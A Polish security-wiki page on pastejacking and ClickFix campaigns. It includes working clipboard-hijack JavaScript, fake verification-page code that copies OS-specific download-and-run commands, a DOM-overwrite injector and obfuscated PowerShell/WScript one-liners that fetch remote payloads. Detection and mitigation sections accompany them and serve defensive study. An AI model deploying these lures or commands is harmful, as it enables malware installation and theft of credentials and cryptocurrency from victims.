# Ataki Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> „Nigdy nie wklejaj niczego, czego samodzielnie nie skopiowałeś.” – stara, ale wciąż aktualna rada

## Omówienie

Clipboard hijacking – znany również jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia, nie sprawdzając ich treści. Złośliwa strona internetowa (lub dowolny kontekst obsługujący JavaScript, taki jak aplikacja Electron lub desktopowa) programowo umieszcza kontrolowany przez atakującego tekst w systemowym schowku. Ofiary są nakłaniane, zwykle za pomocą starannie przygotowanych instrukcji wykorzystujących social engineering, do naciśnięcia **Win + R** (okno Uruchamianie), **Win + X** (menu szybkiego dostępu / PowerShell) lub otwarcia terminala i *wklejenia* zawartości schowka, co natychmiast wykonuje dowolne polecenia.

Ponieważ **żaden plik nie jest pobierany ani żaden załącznik otwierany**, technika ta omija większość zabezpieczeń poczty e-mail i treści internetowych, które monitorują załączniki, makra lub bezpośrednie wykonywanie poleceń. Dlatego atak ten jest popularny w kampaniach phishingowych dostarczających powszechnie dostępne rodziny malware, takie jak NetSupport RAT, loader Latrodectus czy Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipperty podmieniające adresy portfeli

Inny wariant **clipboard hijacking** wcale nie wkleja poleceń: czeka, aż ofiara skopiuje **adres portfela kryptowalutowego**, a następnie po cichu podmienia go na adres kontrolowany przez atakującego tuż przed wklejeniem. Jest to szczególnie skuteczne w przypadku długich formatów adresów portfeli, ponieważ użytkownicy często sprawdzają tylko pierwsze i ostatnie znaki.<sup>[[8]](#references)</sup>

Typowe cechy spotykane w rzeczywistych atakach:
- **Lekki loader + zagnieżdżony payload**: widoczna aplikacja/plik exe wygląda jak legalne narzędzie do tradingu lub „zarabiania”, podczas gdy właściwy clipper jest ukryty głębiej w pakiecie (na przykład loader .NET uruchamia zagnieżdżony payload Rust).
- **Podmiana oparta na wyrażeniach regularnych**: malware dopasowuje ciągi takie jak `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` lub nawet ogólne ciągi **44 znaków przypominające adresy Solana**, a następnie podmienia je na adresy portfeli atakującego.
- **Rotacja adresów portfeli na dużą skalę**: współczesne próbki dla Windows mogą zawierać **tysiące** adresów do podmiany dla każdej waluty zamiast jednego statycznego adresu, ograniczając spadek reputacji adresu po każdej kradzieży.<sup>[[8]](#references)</sup>

### Przebieg działania clippera w Windows

Typowa implementacja wykorzystuje ukryte okno zarejestrowane za pomocą **`AddClipboardFormatListener`**. Przy każdej aktualizacji schowka malware zazwyczaj wywołuje:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → uzyskanie dostępu do bieżących danych schowka.
- **`GetClipboardData`** → odczyt tekstu.
- **`EmptyClipboard`** + **`SetClipboardData`** → podmiana ciągu z adresem portfela na wartość atakującego.

Minimalne wyrażenia regularne używane do wykrywania, często spotykane w clipperach:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Uprawnienia użytkownika wystarczą, aby uzyskać wpływ. Zaobserwowano między innymi taki schemat:<sup>[[8]](#references)</sup>
- Skopiowanie payloadu do **`%APPDATA%\silke\silke.exe`**
- Utworzenie **pliku LNK w folderze Autostart** w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Pomysły na wykrywanie:
- Procesy, które stale wywołują API schowka, a jednocześnie zapisują pliki w `%APPDATA%` i folderze użytkownika **Autostart**.
- Tworzenie nowych plików LNK lub plików wykonywalnych, po którym następuje podmiana adresu portfela w schowku.
- Archiwa lub paczki z fałszywym oprogramowaniem zawierające wiele nieużywanych plików oraz mały program uruchamiający zagnieżdżony plik binarny.

### Usuwanie kwarantanny za pomocą socjotechniki i utrwalanie przez LaunchAgent w macOS

W macOS niektóre kampanie dostarczają pomocniczy plik **`unlocker.command`** i instruują ofiarę, aby kliknęła prawym przyciskiem myszy → **Otwórz**, jeśli Gatekeeper informuje, że aplikacja jest uszkodzona lub pochodzi od niezidentyfikowanego dewelopera. Skrypt po prostu usuwa kwarantannę i uruchamia znajdujący się obok plik `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

To **nie** jest exploit Gatekeepera; to **obejście kwarantanny oparte na socjotechnice**, które wykorzystuje fakt, że decyzje Gatekeepera zależą od atrybutu xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Po uruchomieniu clipper może utrwalić się jako bieżący użytkownik, zapisując:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – skrypt opakowujący
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent z `RunAtLoad` i `KeepAlive`

Przydatny szczegół z punktu widzenia obrony: niektóre próbki implementują **samonaprawiający się watchdog**, który co około 30 sekund ponownie zapisuje LaunchAgent i skrypt opakowujący. Jeśli najpierw usuniesz plist **bez zakończenia działającego procesu**, malware może natychmiast odtworzyć ten plik.<sup>[[8]](#references)</sup> Bezpieczna kolejność czyszczenia:
1. Zakończ działający proces clippera.
2. Wyładuj/usuń plist LaunchAgent.
3. Usuń `~/launch.sh` i skopiowany payload.

### Uwaga dotycząca dostarczania: fałszywa reputacja jako mnożnik skuteczności

W przypadku tej rodziny samo malware może pozostać technicznie proste, podczas gdy **warstwa dystrybucji** wykonuje większość pracy: fałszywe gwiazdki i forki na GitHubie, recenzje/pobrania ze SourceForge, komentarze/wyświetlenia samouczków na YouTube oraz wyglądające na nieszkodliwe komentarze/głosy w VirusTotal mają sprawić, że plik binarny będzie wyglądał wiarygodnie przed uruchomieniem.<sup>[[8]](#references)</sup>

## Wymuszanie użycia przycisków kopiowania i ukryte payloady (jednowierszowe polecenia macOS)

Niektóre infostealery macOS klonują strony instalatorów (np. Homebrew) i **wymuszają użycie przycisku „Copy”**, aby użytkownicy nie mogli zaznaczyć tylko widocznego tekstu. Wpis schowka zawiera oczekiwane polecenie instalatora oraz dopisany payload Base64 (np. `...; echo <b64> | base64 -d | sh`), więc jedno wklejenie uruchamia oba elementy, podczas gdy interfejs ukrywa dodatkowy etap.<sup>[[5]](#references)</sup>

## Proof of Concept w JavaScript

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Starsze kampanie używały `document.execCommand('copy')`, nowsze opierają się na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Przebieg ClickFix / ClearFake

1. Użytkownik odwiedza stronę z typosquattingiem lub przejętą stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty JavaScript **ClearFake** wywołuje helper `unsecuredCopyToClipboard()`, który po cichu zapisuje w schowku jednolinijkowe polecenie PowerShell zakodowane w Base64.
3. Instrukcje HTML mówią ofierze: *„Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. `powershell.exe` zostaje uruchomiony i pobiera archiwum zawierające legalny plik wykonywalny oraz złośliwą bibliotekę DLL (klasyczny DLL sideloading).
5. Loader odszyfrowuje kolejne etapy, wstrzykuje shellcode i ustanawia persistence (np. za pomocą zaplanowanego zadania) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Przykładowy łańcuch NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legalny Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwa biblioteka DLL dynamicznie rozwiązuje adresy API za pomocą **GetProcAddress**, pobiera dwa pliki binarne (`data_3.bin`, `data_4.bin`) za pomocą **curl.exe**, odszyfrowuje je przy użyciu rotacyjnego klucza XOR `"https://google.com/"`, wstrzykuje końcowy shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Pobiera `la.txt` za pomocą **curl.exe**
2. Uruchamia downloader JScript w **cscript.exe**
3. Pobiera payload MSI → umieszcza `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer przez MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Wywołanie **mshta** uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wypakowuje `Boat.pst` (CAB), odtwarza `AutoIt3.exe` za pomocą `extrac32` i łączenia plików, a na koniec uruchamia skrypt `.a3x`, który eksfiltruje dane logowania do przeglądarek do `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Schowek → PowerShell → JS eval → LNK w autostarcie z rotującym C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i zamiast tego instruują ofiary, by wkleiły jednolinijkowy kod, który pobiera i wykonuje JavaScript za pośrednictwem WSH, zapewnia trwałość i codziennie zmienia C2. Przykład zaobserwowanego łańcucha:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Kluczowe cechy
- Zaciemniony URL jest odwracany w czasie działania, aby utrudnić pobieżną inspekcję.
- JavaScript utrwala się za pomocą Startup LNK (WScript/CScript) i wybiera C2 na podstawie bieżącego dnia, umożliwiając szybką rotację domen.<sup>[[3]](#references)</sup>

Minimalny fragment JS używany do rotacji C2 według daty:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Następny etap często wdraża loader, który zapewnia persistence i pobiera RAT (np. PureHVNC), często przypinając TLS do zakodowanego na sztywno certyfikatu i dzieląc ruch na fragmenty.<sup>[[3]](#references)</sup>

Pomysły na wykrywanie specyficzne dla tego wariantu
- Drzewo procesów: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (lub `cscript.exe`).
- Artefakty autostartu: LNK w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, który wywołuje WScript/CScript ze ścieżką do JS w `%TEMP%`/`%APPDATA%`.
- Telemetria rejestru/RunMRU i wiersza poleceń zawierająca `.split('').reverse().join('')` lub `eval(a.responseText)`.
- Powtarzające się `powershell -NoProfile -NonInteractive -Command -` z dużymi payloadami na stdin, aby przekazywać długie skrypty bez długich wierszy poleceń.
- Zaplanowane zadania, które następnie uruchamiają LOLBins, takie jak `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, w ramach zadania/ścieżki przypominających aktualizator (np. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Nazwy hostów C2 i adresy URL zmieniające się codziennie według wzorca `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Koreluj zdarzenia zapisu do schowka z późniejszym wklejeniem przez Win+R i natychmiastowym uruchomieniem `powershell.exe`.

Zespoły blue team mogą połączyć telemetrię schowka, tworzenia procesów i rejestru, aby wykryć nadużycia pastejackingu:

* Rejestr Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** — szukaj nietypowych wpisów Base64 / zaciemnionych.
* Zdarzenie zabezpieczeń ID **4688** (tworzenie procesu), gdzie `ParentImage` == `explorer.exe`, a `NewProcessName` należy do { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Zdarzenie ID **4663** dotyczące tworzenia plików w `%LocalAppData%\Microsoft\Windows\WinX\` lub folderach tymczasowych tuż przed podejrzanym zdarzeniem 4688.
* Czujniki schowka EDR (jeśli dostępne) — koreluj `Clipboard Write` z natychmiastowym uruchomieniem nowego procesu PowerShell.

## Strony weryfikacyjne w stylu IUAM (ClickFix Generator): kopiowanie ze schowka do konsoli + payloady dostosowane do systemu operacyjnego

Najnowsze kampanie masowo generują fałszywe strony weryfikacyjne CDN/przeglądarki („Just a moment…”, w stylu IUAM), które nakłaniają użytkowników do skopiowania ze schowka poleceń dostosowanych do systemu operacyjnego i wklejenia ich do natywnych konsol. Powoduje to przeniesienie wykonania poza piaskownicę przeglądarki i działa zarówno w systemie Windows, jak i macOS.<sup>[[4]](#references)</sup>

Kluczowe cechy stron generowanych przez builder
- Wykrywanie systemu operacyjnego za pomocą `navigator.userAgent` w celu dopasowania payloadów (Windows PowerShell/CMD lub Terminal w macOS). Opcjonalne przynęty/no-op dla nieobsługiwanych systemów operacyjnych podtrzymują iluzję.
- Automatyczne kopiowanie do schowka po nieszkodliwych działaniach w interfejsie (zaznaczenie pola/Copy), przy czym widoczny tekst może różnić się od zawartości schowka.
- Blokowanie urządzeń mobilnych i wyskakujące okno z instrukcjami krok po kroku: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcjonalne zaciemnianie kodu i injector w pojedynczym pliku, który nadpisuje DOM zainfekowanej strony interfejsem weryfikacyjnym stylizowanym za pomocą Tailwind (bez konieczności rejestracji nowej domeny).<sup>[[4]](#references)</sup>

Przykład: rozbieżność zawartości schowka i rozgałęzianie zależne od systemu operacyjnego
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Trwałość pierwszego uruchomienia w macOS
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, aby wykonywanie trwało po zamknięciu terminala, ograniczając widoczne ślady.<sup>[[4]](#references)</sup>

Przejęcie strony w miejscu na zaatakowanych witrynach
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Pomysły na wykrywanie i threat hunting dotyczące przynęt w stylu IUAM
- Web: Strony wiążące Clipboard API z widżetami weryfikacyjnymi; rozbieżność między wyświetlanym tekstem a zawartością schowka; rozgałęzianie według `navigator.userAgent`; Tailwind + wymiana single-page w podejrzanych kontekstach.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` krótko po interakcji z przeglądarką; instalatory batch/MSI uruchamiane z `%TEMP%`.
- Endpoint macOS: Terminal/iTerm uruchamiające `bash`/`curl`/`base64 -d` z `nohup` w pobliżu zdarzeń związanych z przeglądarką; zadania działające w tle mimo zamknięcia terminala.
- Koreluj historię `RunMRU` Win+R i zapisy do schowka z późniejszym tworzeniem procesów konsolowych.

Zobacz też techniki pomocnicze

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Ewolucja fałszywych CAPTCHA / ClickFix w 2026 r. (ClearFake, Scarlet Goldfinch)

- ClearFake nadal przejmuje witryny WordPress i wstrzykuje JavaScript loadera, który łączy się z zewnętrznymi hostami (Cloudflare Workers, GitHub/jsDelivr), a nawet wywołuje blockchainowe mechanizmy „etherhiding” (np. wysyła żądania POST do endpointów API Binance Smart Chain, takich jak `bsc-testnet.drpc[.]org`), aby pobrać aktualną logikę przynęty. W ostatnim czasie nakładki często wykorzystują fałszywe CAPTCHA, które instruują użytkowników, by skopiowali i wkleili jednolinijkowe polecenie (T1204.004), zamiast cokolwiek pobierać.<sup>[[6]](#references)</sup>
- Wstępne wykonanie jest coraz częściej delegowane do podpisanych hostów skryptów/LOLBAS. W łańcuchach ataków ze stycznia 2026 r. wcześniejsze użycie `mshta` zastąpiono wbudowanym `SyncAppvPublishingServer.vbs`, uruchamianym przez `WScript.exe` z argumentami przypominającymi składnię PowerShell i wykorzystującymi aliasy/wildcardy do pobierania zdalnej zawartości:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` jest podpisany i zwykle używany przez App-V; w połączeniu z `WScript.exe` i nietypowymi argumentami (aliasami `gal`/`gcm`, poleceniami cmdlet z symbolami wieloznacznymi, adresami URL jsDelivr) staje się wyraźnym etapem LOLBAS w ataku ClearFake.<sup>[[6]](#references)</sup>
- W lutym 2026 r. fałszywe payloady CAPTCHA ponownie zaczęły wykorzystywać czyste mechanizmy pobierania PowerShell. Dwa aktywne przykłady:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Pierwszy łańcuch to grabber działający w pamięci, używający `iex(irm ...)`; drugi pobiera plik za pomocą `WinHttp.WinHttpRequest.5.1`, zapisuje tymczasowy plik `.ps1`, a następnie uruchamia go z `-ep bypass` w ukrytym oknie.<sup>[[6]](#references)</sup>

Wskazówki dotyczące wykrywania i threat huntingu dla tych wariantów
- Łańcuch procesów: przeglądarka → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` lub polecenia PowerShell pobierające i uruchamiające kod, bezpośrednio po zapisaniu do schowka lub użyciu Win+R.
- Słowa kluczowe w wierszu poleceń: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domeny jsDelivr/GitHub/Cloudflare Worker lub wzorce `iex(irm ...)` z surowym adresem IP.
- Sieć: połączenia wychodzące do hostów CDN Worker lub endpointów blockchain RPC z hostów skryptów albo PowerShell, krótko po przeglądaniu stron.
- Pliki/rejestr: tworzenie tymczasowych plików `.ps1` w `%TEMP%` oraz wpisy RunMRU zawierające te jednolinijkowe polecenia; blokuj lub generuj alerty, gdy podpisane skrypty LOLBAS (WScript/cscript/mshta) są uruchamiane z zewnętrznymi URL-ami lub obfuskowanymi aliasami.

## Taktyki ClickFix z czerwca 2026 r.: telemetria wklejania, fałszywe komentarze weryfikacyjne i łańcuchy LOLBin

Najnowsza telemetria Red Canary pokazuje, że trwałym wskaźnikiem **nie jest jedno konkretne polecenie**, lecz połączenie **wklejania i uruchamiania z pomocą użytkownika**, **zaufanych interpreterów/LOLBins**, **obfuskowanych flag**, **zdalnego pobierania** i **natychmiastowego uruchomienia**.<sup>[[7]](#references)</sup>

### Charakterystyczne wzorce działań operatorów

- **Telemetria potwierdzająca wklejenie**: niektóre payloady wywołują `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` przed właściwym etapem. Potwierdza to interakcję użytkownika, a zarazem pozwala zachować krótki czas działania i niewielką widoczność.
- **Fałszywe komentarze weryfikacyjne**: jednolinijkowe polecenia PowerShell mogą dopisywać ciągi takie jak `# Security check ✔️ I'm not a robot Verification ID: 138105`, dzięki czemu po wklejeniu do Run / `cmd.exe` / historii PowerShell polecenie nadal wygląda na związane z CAPTCHA.
- **Dynamiczne odtwarzanie URL-a**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` pozwala uniknąć umieszczania statycznego URL-a w wierszu poleceń, a jednocześnie pobrać kod i uruchomić go w pamięci.
- **Uruchamianie podszywającego się instalatora**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` nadużywa nietypowej wielkości liter i znaków podobnych do Unicode we flagach, aby ominąć kruche mechanizmy wykrywania, a jednocześnie przypominać `msiexec.exe`.
- **Łańcuchy LOLBin z maskowaniem znakami daszka**: `cmd.exe` może ukrywać słowa kluczowe za pomocą znaków `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), uruchomić zagnieżdżoną powłokę w stanie zminimalizowanym, zapisać zawartość atakującego z nieszkodliwym rozszerzeniem, takim jak `.pdf`, a następnie uruchomić ją za pomocą `mshta`.<sup>[[7]](#references)</sup>
## Środki zaradcze

1. Zabezpieczenie przeglądarki – wyłącz zapis do schowka (`dom.events.asyncClipboard.clipboardItem` itp.) lub wymagaj gestu użytkownika.
2. Świadomość bezpieczeństwa – ucz użytkowników wpisywania poufnych poleceń lub wklejania ich najpierw do edytora tekstu.
3. PowerShell Constrained Language Mode / Execution Policy oraz Application Control, aby blokować dowolne jednolinijkowe polecenia.
4. Kontrola sieci – blokuj połączenia wychodzące ze znanymi domenami pastejackingu i malware C2.

## Powiązane techniki

* **Przejmowanie zaproszeń Discord** często wykorzystuje to samo podejście ClickFix, zwabiając użytkowników na złośliwy serwer:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Napraw kliknięcie: zapobieganie wektorowi ataku ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Pod czystą kurtyną: od RAT-a do buildera i codera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Fabryka ClickFix: pierwsze ujawnienie generatora IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, rok infostealera](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – analizy wywiadowcze: luty 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – analizy wywiadowcze: czerwiec 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – od gwiazdek do głosów: fałszywa reputacja napędza porywacza schowka kryptowalutowego](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
